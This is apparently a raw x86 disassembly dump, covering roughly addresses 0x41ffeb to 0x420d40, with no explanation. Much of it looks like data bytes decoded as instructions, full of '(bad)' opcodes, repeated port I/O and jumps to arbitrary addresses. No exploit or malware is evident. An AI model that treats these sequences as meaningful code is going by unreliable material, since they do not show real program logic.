  41ffeb:	dec    eax
  41ffec:	mov    ah,0x48
  41ffee:	dec    esp
  41ffef:	dec    esp
  41fff0:	mov    al,0x4c
  41fff2:	push   eax
  41fff3:	push   eax
  41fff4:	lods   al,BYTE PTR ds:[esi]
  41fff5:	push   eax
  41fff6:	push   esp
  41fff7:	push   esp
  41fff8:	test   al,0x54
  41fffa:	pop    eax
  41fffb:	pop    eax
  41fffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fffd:	pop    eax
  41fffe:	pop    esp
  41ffff:	pop    esp
  420000:	mov    al,ds:0x9c60605c
  420005:	pusha  
  420006:	fs fs cwde 
  420009:	fs push 0x6c689468
  42000f:	ins    BYTE PTR es:[edi],dx
  420010:	nop
  420011:	ins    BYTE PTR es:[edi],dx
  420012:	jo     0x420084
  420014:	mov    WORD PTR [eax+0x74],?
  420017:	je     0x41ffa1
  420019:	je     0x420093
  42001b:	js     0x41ffa1
  42001d:	js     0x42009b
  42001f:	jl     0x41ffa1
  420021:	jl     0x41ffa3
  420023:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  420028:	js     0x41ffae
  42002a:	mov    BYTE PTR [eax-0x7373778c],cl
  420030:	jo     0x41ffbe
  420032:	nop
  420033:	nop
  420034:	ins    BYTE PTR es:[edi],dx
  420035:	nop
  420036:	xchg   esp,eax
  420037:	xchg   esp,eax
  420038:	push   0x64989894
  42003d:	cwde   
  42003e:	pushf  
  42003f:	pushf  
  420040:	pusha  
  420041:	pushf  
  420042:	mov    al,ds:0xa4a05ca0
  420047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420048:	pop    eax
  420049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42004a:	test   al,0xa8
  42004c:	push   esp
  42004d:	test   al,0xac
  42004f:	lods   al,BYTE PTR ds:[esi]
  420050:	push   eax
  420051:	lods   al,BYTE PTR ds:[esi]
  420052:	mov    al,0xb0
  420054:	dec    esp
  420055:	mov    al,0xb4
  420057:	mov    ah,0x48
  420059:	mov    ah,0xb8
  42005b:	mov    eax,0xbcbcb844
  420060:	inc    eax
  420061:	mov    esp,0xc03cc0c0
  420066:	(bad)  
  420067:	les    edi,FWORD PTR [eax]
  420069:	(bad)  
  42006a:	enter  0x34c8,0xc8
  42006e:	int3   
  42006f:	int3   
  420070:	xor    ah,cl
  420072:	rcl    al,1
  420074:	sub    al,0xd0
  420076:	aam    0xd4
  420078:	sub    ah,dl
  42007a:	fcomp  st(0)
  42007c:	and    al,0xd8
  42007e:	(bad)  
  420080:	and    ah,bl
  420082:	loopne 0x420064
  420084:	sbb    al,0xe0
  420086:	in     al,0xe4
  420088:	sbb    ah,ah
  42008a:	call   0xed2a1577
  42008f:	in     al,dx
  420090:	adc    ah,ch
  420092:	lock lock or al,0xf0
  420096:	hlt    
  420097:	hlt    
  420098:	or     ah,dh
  42009a:	clc    
  42009b:	clc    
  42009c:	add    al,0xf8
  42009e:	cld    
  42009f:	cld    
  4200a0:	add    ah,bh
	...
  4206aa:	add    BYTE PTR [eax],al
  4206ac:	adc    DWORD PTR [edx],ebx
  4206ae:	or     dh,BYTE PTR ds:0xa9110c06
  4206b4:	push   es
  4206b5:	pop    es
  4206b6:	ret    
  4206b7:	or     al,BYTE PTR [eax]
	...
  42070d:	add    BYTE PTR [eax],al
  42070f:	add    ch,ch
  420711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420712:	xchg   esi,eax
  420713:	jae    0x42075e
  420715:	scas   eax,DWORD PTR es:[edi]
  420716:	inc    ecx
  420717:	ja     0x4206f1
  420719:	cmp    eax,0xece831b3
  42071e:	in     al,dx
  42071f:	in     al,dx
  420720:	in     al,dx
  420721:	xlat   BYTE PTR ds:[ebx]
  420722:	cmc    
  420723:	ja     0x420756
  420725:	call   0x762fb399
  42072a:	xor    eax,ebp
  42072c:	ja     0x420767
  42072e:	call   0x603e405a
  420733:	(bad)  
  420734:	ja     0x420777
  420736:	hlt    
  420737:	out    dx,eax
  420738:	inc    ecx
  420739:	call   0xf03a38b5
  42073e:	xor    eax,ebp
  420740:	jbe    0x420736
  420742:	je     0x42073a
  420744:	xlat   BYTE PTR ds:[ebx]
  420745:	leave  
  420746:	ja     0x420719
  420748:	dec    ecx
  420749:	scas   eax,DWORD PTR es:[edi]
  42074a:	inc    ecx
  42074b:	ja     0x420725
  42074d:	ins    DWORD PTR es:[edi],dx
  42074e:	fmul   st,st(4)
  420750:	icebp  
  420751:	in     al,dx
  420752:	in     al,dx
  420753:	mov    bl,0x71
  420755:	inc    eax
  420756:	jmp    0x420743
  420758:	jmp    0x420746
  42075a:	in     al,dx
  42075b:	in     al,dx
  42075c:	in     al,dx
  42075d:	mov    bl,0x71
  42075f:	test   dh,ah
  420761:	jmp    0x42074e
  420763:	in     al,dx
  420764:	in     al,dx
  420765:	in     al,dx
  420766:	in     al,dx
  420767:	mov    bl,0x71
  420769:	sub    al,0xe7
  42076b:	jmp    0x420758
  42076d:	in     al,dx
  42076e:	in     al,dx
  42076f:	in     al,dx
  420770:	in     al,dx
  420771:	ja     0x4207a4
  420773:	hlt    
  420774:	jne    0x4207a7
  420776:	test   BYTE PTR [edi+0x39],dh
  420779:	clc    
  42077a:	jne    0x4207f5
  42077c:	inc    esp
  42077d:	out    0xeb,eax
  42077f:	jmp    0x420734
  420781:	jno    0x42079b
  420783:	jmp    0x420770
  420785:	jmp    0x420773
  420787:	in     al,dx
  420788:	in     al,dx
  420789:	in     al,dx
  42078a:	mov    bl,0x71
  42078c:	fs call 0xed2ef37d
  420792:	in     al,dx
  420793:	in     al,dx
  420794:	mov    bl,0x71
  420796:	push   esp
  420797:	out    0xeb,eax
  420799:	jmp    0x420787
  42079b:	in     al,dx
  42079c:	in     al,dx
  42079d:	in     al,dx
  42079e:	mov    bl,0x71
  4207a0:	jl     0x42078a
  4207a2:	jmp    0x42078f
  4207a4:	in     al,dx
  4207a5:	in     al,dx
  4207a6:	in     al,dx
  4207a7:	in     al,dx
  4207a8:	mov    bl,0x71
  4207aa:	push   0xecebebe8
  4207af:	in     al,dx
  4207b0:	in     al,dx
  4207b1:	in     al,dx
  4207b2:	mov    bl,0x71
  4207b4:	sbb    al,0xeb
  4207b6:	jmp    0x4207a3
  4207b8:	in     al,dx
  4207b9:	in     al,dx
  4207ba:	in     al,dx
  4207bb:	in     al,dx
  4207bc:	mov    bl,0x71
  4207be:	fsubr  st,st(0)
  4207c0:	jmp    0x4207ad
  4207c2:	in     al,dx
  4207c3:	in     al,dx
  4207c4:	in     al,dx
  4207c5:	in     al,dx
  4207c6:	mov    bl,0x71
  4207c8:	dec    eax
  4207c9:	out    0xeb,eax
  4207cb:	jmp    0x4207b9
  4207cd:	in     al,dx
  4207ce:	in     al,dx
  4207cf:	in     al,dx
  4207d0:	mov    bl,0x71
  4207d2:	ins    BYTE PTR es:[edi],dx
  4207d3:	call   0xed2ef3c3
  4207d8:	in     al,dx
  4207d9:	in     al,dx
  4207da:	mov    bl,0x31
  4207dc:	mov    esp,gs
  4207de:	in     al,dx
  4207df:	in     al,dx
  4207e0:	in     al,dx
  4207e1:	mov    bl,0x71
  4207e3:	pop    eax
  4207e4:	out    0xeb,eax
  4207e6:	jmp    0x4207d4
  4207e8:	in     al,dx
  4207e9:	in     al,dx
  4207ea:	in     al,dx
  4207eb:	mov    bl,0x71
  4207ed:	and    bl,ch
  4207ef:	jmp    0x4207dc
  4207f1:	in     al,dx
  4207f2:	in     al,dx
  4207f3:	in     al,dx
  4207f4:	in     al,dx
  4207f5:	mov    bl,0x71
  4207f7:	inc    esp
  4207f8:	jmp    0x4207e5
  4207fa:	jmp    0x4207e8
  4207fc:	in     al,dx
  4207fd:	in     al,dx
  4207fe:	in     al,dx
  4207ff:	mov    bl,0x71
  420801:	sub    al,0xeb
  420804:	jmp    0x4207f2
  420806:	in     al,dx
  420807:	in     al,dx
  420808:	in     al,dx
  420809:	mov    bl,0x71
  42080b:	mov    dh,ah
  42080d:	jmp    0x4207fa
  42080f:	in     al,dx
  420810:	in     al,dx
  420811:	in     al,dx
  420812:	in     al,dx
  420813:	ja     0x420846
  420815:	hlt    
  420816:	push   edx
  420817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420818:	in     al,dx
  420819:	in     al,dx
  42081a:	jne    0x42088d
  42081c:	sub    al,0xeb
  42081f:	jmp    0x420873
  420821:	mov    bl,0x71
  420823:	dec    esp
  420824:	out    0xeb,eax
  420826:	jmp    0x420861
  420828:	inc    esi
  420829:	mov    bl,0x71
  42082b:	js     0x420813
  42082d:	jmp    0x42081a
  42082f:	in     al,dx
  420830:	in     al,dx
  420831:	in     al,dx
  420832:	in     al,dx
  420833:	xlat   BYTE PTR ds:[ebx]
  420834:	sti    
  420835:	ja     0x4207b8
  420837:	js     0x42081f
  420839:	jmp    0x420826
  42083b:	outs   dx,DWORD PTR ds:[esi]
  42083c:	scas   al,BYTE PTR es:[edi]
  42083d:	in     eax,dx
  42083e:	jne    0x4207c1
  420840:	js     0x420828
  420842:	jmp    0x42082f
  420844:	outs   dx,DWORD PTR ds:[esi]
  420845:	test   eax,0xebebe678
  42084a:	neg    BYTE PTR [edi+0x2b]
  42084d:	outs   dx,DWORD PTR ds:[esi]
  42084e:	test   eax,0xebebe688
  420853:	in     al,dx
  420854:	popa   
  420855:	and    bh,bl
  420857:	mov    ds:0xebe74c71,eax
  42085c:	jmp    0x4208d5
  42085e:	jns    0x4207e0
  420860:	call   0xa43df450
  420865:	std    
  420866:	daa    
  420867:	scas   al,BYTE PTR es:[edi]
  420868:	popa   
  420869:	cli    
  42086a:	ja     0x4208dd
  42086c:	sub    al,0xeb
  42086f:	jmp    0x4208e6
  420871:	jno    0x4207fb
  420873:	out    0xeb,al
  420875:	jmp    0x42084e
  420877:	(bad)  
  420878:	ja     0x4208f3
  42087a:	sub    al,0xeb
  42087d:	jmp    0x4208ec
  42087f:	aad    0xec
  420881:	in     al,dx
  420882:	in     eax,dx
  420883:	in     al,dx
  420884:	jne    0x4208ff
  420886:	sub    al,0xeb
  420889:	jmp    0x420862
  42088b:	xchg   ebp,eax
  42088c:	mov    dl,0x71
  42088e:	dec    eax
  42088f:	jmp    0x42087c
  420891:	jmp    0x4208c6
  420893:	mov    dl,0x71
  420895:	dec    ecx
  420896:	jmp    0x420883
  420898:	jmp    0x4208eb
  42089a:	mov    dl,0x71
  42089c:	dec    edx
  42089d:	jmp    0x42088a
  42089f:	jmp    0x420901
  4208a1:	mov    dl,0x71
  4208a3:	dec    ebx
  4208a4:	jmp    0x420891
  4208a6:	jmp    0x4208e1
  4208a8:	mov    dl,0x71
  4208aa:	dec    esp
  4208ab:	jmp    0x420898
  4208ad:	jmp    0x42090a
  4208af:	mov    dl,0x71
  4208b1:	dec    ebp
  4208b2:	jmp    0x42089f
  4208b4:	jmp    0x420906
  4208b6:	mov    dl,0x71
  4208b8:	dec    esi
  4208b9:	jmp    0x4208a6
  4208bb:	jmp    0x42091e
  4208bd:	mov    dl,0x71
  4208bf:	dec    edi
  4208c0:	jmp    0x4208ad
  4208c2:	jmp    0x42091c
  4208c4:	mov    dl,0x71
  4208c6:	push   eax
  4208c7:	jmp    0x4208b4
  4208c9:	jmp    0x42091c
  4208cb:	mov    dl,0x71
  4208cd:	push   ecx
  4208ce:	jmp    0x4208bb
  4208d0:	jmp    0x420906
  4208d2:	mov    dl,0x71
  4208d4:	push   edx
  4208d5:	jmp    0x4208c2
  4208d7:	jmp    0x420926
  4208d9:	mov    dl,0x71
  4208db:	push   ebx
  4208dc:	jmp    0x4208c9
  4208de:	jmp    0x42093a
  4208e0:	mov    dl,0x71
  4208e2:	push   esp
  4208e3:	jmp    0x4208d0
  4208e5:	jmp    0x420937
  4208e7:	mov    dl,0x71
  4208e9:	push   ebp
  4208ea:	jmp    0x4208d7
  4208ec:	jmp    0x420946
  4208ee:	mov    dl,0x71
  4208f0:	push   esi
  4208f1:	jmp    0x4208de
  4208f3:	jmp    0x420946
  4208f5:	mov    dl,0x71
  4208f7:	push   edi
  4208f8:	jmp    0x4208e5
  4208fa:	jmp    0x420929
  4208fc:	mov    dl,0x71
  4208fe:	pop    eax
  4208ff:	jmp    0x4208ec
  420901:	jmp    0x4208ef
  420903:	jns    0x420886
  420905:	dec    eax
  420906:	jmp    0x4208f3
  420908:	jmp    0x420948
  42090a:	ja     0x42097d
  42090c:	mov    dh,ah
  42090e:	jmp    0x4208fb
  420910:	cmp    al,0xeb
  420912:	add    DWORD PTR [edi+eiz*8-0x15],0x843175eb
  42091a:	mov    bl,0x31
  42091c:	nop
  42091d:	mov    ds,WORD PTR [esp+ebp*8-0x6bce4c14]
  420924:	in     al,dx
  420925:	in     al,dx
  420926:	in     al,dx
  420927:	in     al,dx
  420928:	mov    bl,0x31
  42092a:	cwde   
  42092b:	in     al,dx
  42092c:	in     al,dx
  42092d:	in     al,dx
  42092e:	in     al,dx
  42092f:	mov    bl,0x31
  420931:	pushf  
  420932:	pop    edi
  420933:	int3   
  420934:	mov    ecx,0xa031b397
  420939:	pusha  
  42093a:	int3   
  42093b:	mov    ecx,0xa431b397
  420940:	popa   
  420941:	int3   
  420942:	mov    ecx,0xa831b397
  420947:	(bad)  
  420948:	int3   
  420949:	mov    ecx,0xac31b397
  42094e:	arpl   sp,cx
  420950:	mov    ecx,0xb031b397
  420955:	fs int3 
  420957:	mov    ecx,0xb431b397
  42095c:	gs int3 
  42095e:	mov    ecx,0xd471b397
  420963:	out    0xeb,al
  420965:	jmp    0x420953
  420967:	cmp    al,0xed
  420969:	in     al,dx
  42096a:	mov    bl,0x71
  42096c:	fsub   st,st(6)
  42096e:	jmp    0x42095b
  420970:	in     al,dx
  420971:	in     al,dx
  420972:	in     al,dx
  420973:	in     al,dx
  420974:	mov    bl,0x71
  420976:	fsubr  st(6),st
  420978:	jmp    0x420965
  42097a:	in     al,dx
  42097b:	in     al,dx
  42097c:	in     al,dx
  42097d:	in     al,dx
  42097e:	mov    bl,0x71
  420980:	loopne 0x420968
  420982:	jmp    0x42096f
  420984:	outs   dx,DWORD PTR ds:[esi]
  420985:	int3   
  420986:	mov    ecx,0xe471b397
  42098b:	out    0xeb,al
  42098d:	jmp    0x4209ff
  42098f:	int3   
  420990:	mov    ecx,0xe871b397
  420995:	out    0xeb,al
  420997:	jmp    0x420a0a
  420999:	int3   
  42099a:	mov    ecx,0xec71b397
  42099f:	out    0xeb,eax
  4209a1:	jmp    0x420a15
  4209a3:	int3   
  4209a4:	mov    ecx,0xf071b397
  4209a9:	out    0xeb,eax
  4209ab:	jmp    0x420a20
  4209ad:	int3   
  4209ae:	mov    ecx,0xf471b397
  4209b3:	out    0xeb,eax
  4209b5:	jmp    0x420a2b
  4209b7:	int3   
  4209b8:	mov    ecx,0xf871b397
  4209bd:	out    0xeb,eax
  4209bf:	jmp    0x420a36
  4209c1:	int3   
  4209c2:	mov    ecx,0xb831b397
  4209c7:	lock in al,dx
  4209c9:	in     al,dx
  4209ca:	in     al,dx
  4209cb:	mov    bl,0x31
  4209cd:	mov    esp,0xecececec
  4209d2:	mov    bl,0x31
  4209d4:	shr    ah,0xec
  4209d7:	in     al,dx
  4209d8:	in     al,dx
  4209d9:	mov    bl,0x31
  4209db:	(bad)  
  4209dc:	in     al,dx
  4209dd:	in     al,dx
  4209de:	in     al,dx
  4209df:	in     al,dx
  4209e0:	mov    bl,0x31
  4209e2:	enter  0xecec,0xec
  4209e6:	in     al,dx
  4209e7:	mov    bl,0x31
  4209e9:	int3   
  4209ea:	in     al,dx
  4209eb:	in     al,dx
  4209ec:	in     al,dx
  4209ed:	in     al,dx
  4209ee:	mov    bl,0x31
  4209f0:	shr    ah,1
  4209f2:	in     al,dx
  4209f3:	in     al,dx
  4209f4:	in     al,dx
  4209f5:	mov    bl,0x31
  4209f7:	aam    0xec
  4209f9:	in     al,dx
  4209fa:	in     al,dx
  4209fb:	in     al,dx
  4209fc:	mov    bl,0x31
  4209fe:	fsubr  st,st(4)
  420a00:	in     al,dx
  420a01:	in     al,dx
  420a02:	in     al,dx
  420a03:	mov    bl,0x31
  420a05:	fsub   st(4),st
  420a07:	in     al,dx
  420a08:	in     al,dx
  420a09:	in     al,dx
  420a0a:	mov    dl,0x71
  420a0c:	test   al,ch
  420a0e:	jmp    0x4209fb
  420a10:	aaa    
  420a11:	mov    dl,0x71
  420a13:	mov    ebp,eax
  420a15:	jmp    0x420a02
  420a17:	push   ds
  420a18:	mov    dl,0x71
  420a1a:	mov    eax,gs
  420a1c:	jmp    0x420a09
  420a1e:	sbb    dh,BYTE PTR [edx-0x1417728f]
  420a24:	jmp    0x420a76
  420a26:	mov    dl,0x71
  420a28:	xchg   eax,ebp
  420a2a:	jmp    0x420a17
  420a2c:	pop    edx
  420a2d:	mov    dl,0x71
  420a2f:	mov    eax,ebp
  420a31:	jmp    0x420a1e
  420a33:	pop    eax
  420a34:	mov    dl,0x71
  420a36:	nop
  420a37:	call   0xb32ef627
  420a3c:	jno    0x4209c8
  420a3e:	call   0xb261f62e
  420a43:	jno    0x4209ca
  420a45:	call   0xb293f635
  420a4a:	jno    0x4209d2
  420a4c:	call   0xb2a0f63c
  420a51:	jno    0x4209e1
  420a53:	call   0xb29af643
  420a58:	jno    0x4209e9
  420a5a:	call   0xb29af64a
  420a5f:	jno    0x4209e9
  420a61:	call   0x7993f651
  420a66:	jns    0x4209ec
  420a68:	call   0xeb7ff658
  420a6d:	inc    ecx
  420a6e:	test   BYTE PTR [ebp+0x71],dh
  420a71:	inc    eax
  420a72:	jmp    0x420a5f
  420a74:	jmp    0x420acc
  420a76:	in     al,dx
  420a77:	jmp    0x420aba
  420a79:	test   BYTE PTR [ebp+0x71],dh
  420a7c:	test   dh,ah
  420a7e:	jmp    0x420a6b
  420a80:	mov    dl,0x71
  420a82:	mov    esi,fs
  420a84:	jmp    0x420a71
  420a86:	inc    edx
  420a87:	mov    dl,0x71
  420a89:	xchg   ebx,eax
  420a8a:	out    0xeb,al
  420a8c:	jmp    0x420abb
  420a8e:	mov    dl,0x71
  420a90:	xchg   esp,eax
  420a91:	out    0xeb,al
  420a93:	jmp    0x420aed
  420a95:	mov    dl,0x71
  420a97:	(bad)  
  420a98:	out    0xeb,al
  420a9a:	jmp    0x420afc
  420a9c:	mov    dl,0x71
  420a9e:	nop
  420a9f:	out    0xeb,al
  420aa1:	jmp    0x420b04
  420aa3:	mov    dl,0x71
  420aa5:	xchg   ebp,eax
  420aa6:	out    0xeb,al
  420aa8:	jmp    0x420b02
  420aaa:	mov    dl,0x71
  420aac:	xchg   esi,eax
  420aad:	out    0xeb,al
  420aaf:	jmp    0x420b0c
  420ab1:	mov    dl,0x71
  420ab3:	xchg   ecx,eax
  420ab4:	out    0xeb,al
  420ab6:	jmp    0x420b05
  420ab8:	mov    dl,0x71
  420aba:	xchg   edx,eax
  420abb:	out    0xeb,al
  420abd:	jmp    0x420b17
  420abf:	mov    dl,0x71
  420ac1:	(bad)  
  420ac2:	out    0xeb,al
  420ac4:	jmp    0x420b1b
  420ac6:	mov    dl,0x71
  420ac8:	mov    fs,esi
  420aca:	jmp    0x420ab7
  420acc:	pop    esi
  420acd:	mov    bl,0x71
  420acf:	xor    al,0xe7
  420ad1:	jmp    0x420abe
  420ad3:	in     al,dx
  420ad4:	in     al,dx
  420ad5:	in     al,dx
  420ad6:	in     al,dx
  420ad7:	mov    dl,0x71
  420ad9:	xchg   edi,eax
  420ada:	out    0xeb,al
  420adc:	jmp    0x420b2d
  420ade:	mov    dl,0x71
  420ae0:	cwde   
  420ae1:	out    0xeb,al
  420ae3:	jmp    0x420ad1
  420ae5:	jns    0x420a68
  420ae7:	mov    esi,fs
  420ae9:	jmp    0x420ad6
  420aeb:	ds ja  0x420b5f
  420aee:	inc    eax
  420aef:	jmp    0x420adc
  420af1:	jmp    0x420b2f
  420af3:	jmp    0x420a76
  420af5:	inc    esp
  420af6:	out    0xeb,eax
  420af8:	jmp    0x420b6f
  420afa:	jno    0x420b5c
  420afc:	call   0x71f4f6ec
  420b01:	xchg   ebx,eax
  420b02:	out    0xeb,al
  420b04:	jmp    0x420b42
  420b06:	mov    dl,0x71
  420b08:	xchg   edi,eax
  420b09:	out    0xeb,al
  420b0b:	jmp    0x420b5e
  420b0d:	mov    dl,0x71
  420b0f:	cwde   
  420b10:	out    0xeb,al
  420b12:	jmp    0x420b63
  420b14:	mov    dl,0x71
  420b16:	cdq    
  420b17:	out    0xeb,al
  420b19:	jmp    0x420b7b
  420b1b:	mov    dl,0x71
  420b1d:	xchg   esp,eax
  420b1e:	out    0xeb,al
  420b20:	jmp    0x420b80
  420b22:	mov    dl,0x71
  420b24:	xchg   ebp,eax
  420b25:	out    0xeb,al
  420b27:	jmp    0x420b84
  420b29:	mov    dl,0x71
  420b2b:	xchg   esi,eax
  420b2c:	out    0xeb,al
  420b2e:	jmp    0x420b90
  420b30:	mov    dl,0x71
  420b32:	call   0x7979:0xecebebe6
  420b39:	mov    esi,fs
  420b3b:	jmp    0x420b28
  420b3d:	cmp    eax,0xeb408177
  420b42:	jmp    0x420b2f
  420b44:	ds jmp 0x420ac8
  420b47:	inc    esp
  420b48:	out    0xeb,eax
  420b4a:	jmp    0x420bc1
  420b4c:	jno    0x420b26
  420b4e:	call   0x71f4f73e
  420b53:	xchg   ebx,eax
  420b54:	out    0xeb,al
  420b56:	jmp    0x420b8a
  420b58:	mov    dl,0x71
  420b5a:	xchg   ebp,eax
  420b5b:	out    0xeb,al
  420b5d:	jmp    0x420bb0
  420b5f:	mov    dl,0x71
  420b61:	xchg   esi,eax
  420b62:	out    0xeb,al
  420b64:	jmp    0x420bb7
  420b66:	mov    dl,0x71
  420b68:	xchg   esp,eax
  420b69:	out    0xeb,al
  420b6b:	jmp    0x420bcb
  420b6d:	mov    dl,0x71
  420b6f:	xchg   edi,eax
  420b70:	out    0xeb,al
  420b72:	jmp    0x420b60
  420b74:	jns    0x420be7
  420b76:	mov    esi,fs
  420b78:	jmp    0x420b65
  420b7a:	cmp    al,0x77
  420b7c:	jns    0x420bbe
  420b7e:	jmp    0x420b6b
  420b80:	jmp    0x420bbf
  420b82:	jmp    0x420b05
  420b84:	inc    esp
  420b85:	out    0xeb,eax
  420b87:	jmp    0x420bfe
  420b89:	jno    0x420bd3
  420b8b:	out    0xeb,eax
  420b8d:	jmp    0x420b41
  420b8f:	jno    0x420b1e
  420b91:	out    0xeb,al
  420b93:	jmp    0x420bf0
  420b95:	mov    dl,0x71
  420b97:	mov    fs,esi
  420b99:	jmp    0x420b86
  420b9b:	dec    ebp
  420b9c:	mov    dl,0x71
  420b9e:	(bad)  
  420b9f:	out    0xeb,al
  420ba1:	jmp    0x420bf3
  420ba3:	mov    dl,0x71
  420ba5:	mov    esi,fs
  420ba7:	jmp    0x420b94
  420ba9:	cmp    BYTE PTR [edx-0x14196f8f],dh
  420baf:	jmp    0x420be9
  420bb1:	mov    dl,0x71
  420bb3:	xchg   esi,eax
  420bb4:	out    0xeb,al
  420bb6:	jmp    0x420c1d
  420bb8:	mov    dl,0x71
  420bba:	xchg   esp,eax
  420bbb:	out    0xeb,al
  420bbd:	jmp    0x420c0c
  420bbf:	mov    dl,0x71
  420bc1:	xchg   ebp,eax
  420bc2:	out    0xeb,al
  420bc4:	jmp    0x420c24
  420bc6:	mov    dl,0x71
  420bc8:	xchg   ecx,eax
  420bc9:	out    0xeb,al
  420bcb:	jmp    0x420c22
  420bcd:	mov    dl,0x71
  420bcf:	xchg   edx,eax
  420bd0:	out    0xeb,al
  420bd2:	jmp    0x420c22
  420bd4:	mov    dl,0x71
  420bd6:	xchg   ebx,eax
  420bd7:	out    0xeb,al
  420bd9:	jmp    0x420c39
  420bdb:	mov    dl,0x71
  420bdd:	xchg   edi,eax
  420bde:	out    0xeb,al
  420be0:	jmp    0x420c0f
  420be2:	mov    dl,0x71
  420be4:	cwde   
  420be5:	out    0xeb,al
  420be7:	jmp    0x420bd5
  420be9:	jns    0x420b6c
  420beb:	mov    esi,fs
  420bed:	jmp    0x420bda
  420bef:	ds ja  0x420c63
  420bf2:	inc    eax
  420bf3:	jmp    0x420be0
  420bf5:	jmp    0x420c33
  420bf7:	jmp    0x420b7a
  420bf9:	inc    esp
  420bfa:	out    0xeb,eax
  420bfc:	jmp    0x420c73
  420bfe:	jno    0x420c30
  420c00:	out    0xeb,eax
  420c02:	jmp    0x420bb6
  420c04:	jno    0x420c62
  420c06:	out    0xeb,eax
  420c08:	jmp    0x420c3d
  420c0a:	mov    dl,0x71
  420c0c:	pop    ebp
  420c0d:	out    0xeb,eax
  420c0f:	jmp    0x420c62
  420c11:	mov    dl,0x71
  420c13:	pop    esi
  420c14:	out    0xeb,eax
  420c16:	jmp    0x420c78
  420c18:	mov    dl,0x71
  420c1a:	pop    edi
  420c1b:	out    0xeb,eax
  420c1d:	jmp    0x420c57
  420c1f:	mov    dl,0x71
  420c21:	pusha  
  420c22:	out    0xeb,eax
  420c24:	jmp    0x420c73
  420c26:	mov    dl,0x71
  420c28:	popa   
  420c29:	out    0xeb,eax
  420c2b:	jmp    0x420c8c
  420c2d:	mov    dl,0x71
  420c2f:	(bad)  
  420c30:	out    0xeb,eax
  420c32:	jmp    0x420c94
  420c34:	mov    dl,0x71
  420c36:	arpl   di,sp
  420c38:	jmp    0x420c25
  420c3a:	xor    DWORD PTR [edx-0x14189b8f],esi
  420c40:	jmp    0x420ca0
  420c42:	mov    dl,0x71
  420c44:	gs out 0xeb,eax
  420c47:	jmp    0x420ca7
  420c49:	mov    dl,0x71
  420c4b:	out    0xeb,ax
  420c4e:	jmp    0x420cab
  420c50:	mov    dl,0x71
  420c52:	addr16 out 0xeb,eax
  420c55:	jmp    0x420cb5
  420c57:	mov    dl,0x71
  420c59:	push   0xecebebe7
  420c5e:	mov    dl,0x71
  420c60:	pop    esp
  420c61:	jmp    0x420c4e
  420c63:	jmp    0x420c94
  420c65:	mov    dl,0x71
  420c67:	pop    ebp
  420c68:	jmp    0x420c55
  420c6a:	jmp    0x420cca
  420c6c:	mov    dl,0x71
  420c6e:	pop    esi
  420c6f:	jmp    0x420c5c
  420c71:	jmp    0x420cc4
  420c73:	mov    dl,0x71
  420c75:	pop    edi
  420c76:	jmp    0x420c63
  420c78:	jmp    0x420cc7
  420c7a:	mov    dl,0x71
  420c7c:	pusha  
  420c7d:	jmp    0x420c6a
  420c7f:	jmp    0x420ce1
  420c81:	mov    dl,0x71
  420c83:	popa   
  420c84:	jmp    0x420c71
  420c86:	jmp    0x420cd9
  420c88:	mov    dl,0x71
  420c8a:	(bad)  
  420c8b:	jmp    0x420c78
  420c8d:	jmp    0x420cc0
  420c8f:	mov    dl,0x71
  420c91:	arpl   bx,bp
  420c93:	jmp    0x420c80
  420c95:	bound  esi,QWORD PTR [edx-0x14149b8f]
  420c9b:	jmp    0x420cee
  420c9d:	mov    dl,0x71
  420c9f:	gs jmp 0x420c8d
  420ca2:	jmp    0x420cfe
  420ca4:	mov    dl,0x71
  420ca6:	data16 jmp 0x420c94
  420ca9:	jmp    0x420d0b
  420cab:	mov    dl,0x71
  420cad:	addr16 jmp 0x420c9b
  420cb0:	jmp    0x420cdf
  420cb2:	mov    dl,0x71
  420cb4:	push   0xecebebeb
  420cb9:	jns    0x420d34
  420cbb:	pop    esp
  420cbc:	jmp    0x420ca9
  420cbe:	jmp    0x420cfd
  420cc0:	ja     0x420c43
  420cc2:	inc    eax
  420cc3:	jmp    0x420cb0
  420cc5:	jmp    0x420d05
  420cc7:	jmp    0x420c4a
  420cc9:	inc    esp
  420cca:	out    0xeb,eax
  420ccc:	jmp    0x420d43
  420cce:	jno    0x420cd0
  420cd0:	out    0xeb,eax
  420cd2:	jmp    0x420d4d
  420cd4:	jno    0x420d32
  420cd6:	out    0xeb,eax
  420cd8:	jmp    0x420d16
  420cda:	ja     0x420d55
  420cdc:	inc    eax
  420cdd:	jmp    0x420cca
  420cdf:	jmp    0x420d1e
  420ce1:	jmp    0x420c64
  420ce3:	inc    esp
  420ce4:	out    0xeb,eax
  420ce6:	jmp    0x420d5d
  420ce8:	jno    0x420d0e
  420cea:	jmp    0x420cd7
  420cec:	jmp    0x420ca1
  420cee:	jno    0x420d5c
  420cf0:	out    0xeb,eax
  420cf2:	jmp    0x420ce0
  420cf4:	in     al,dx
  420cf5:	in     al,dx
  420cf6:	in     al,dx
  420cf7:	mov    bl,0x71
  420cf9:	aam    0xe8
  420cfb:	jmp    0x420ce8
  420cfd:	in     al,dx
  420cfe:	in     al,dx
  420cff:	in     al,dx
  420d00:	in     al,dx
  420d01:	mov    bl,0x71
  420d03:	enter  0xebe8,0xeb
  420d07:	in     al,dx
  420d08:	in     al,dx
  420d09:	in     al,dx
  420d0a:	in     al,dx
  420d0b:	mov    dl,0x71
  420d0d:	jo     0x420cf7
  420d0f:	jmp    0x420cfc
  420d11:	dec    eax
  420d12:	mov    dl,0x71
  420d14:	jno    0x420cfe
  420d16:	jmp    0x420d03
  420d18:	in     al,dx
  420d19:	mov    dl,0x71
  420d1b:	jo     0x420d04
  420d1d:	jmp    0x420d0a
  420d1f:	pop    edi
  420d20:	mov    dl,0x71
  420d22:	jno    0x420d0b
  420d24:	jmp    0x420d11
  420d26:	pop    ebp
  420d27:	mov    dl,0x71
  420d29:	jb     0x420d12
  420d2b:	jmp    0x420d18
  420d2d:	pop    eax
  420d2e:	mov    dl,0x71
  420d30:	jae    0x420d19
  420d32:	jmp    0x420d1f
  420d34:	pop    edi
  420d35:	mov    dl,0x71
  420d37:	je     0x420d20
  420d39:	jmp    0x420d26
  420d3b:	pop    esi
  420d3c:	mov    dl,0x71
  420d3e:	jne    0x420d27
  420d40:	jmp    0x420d2d
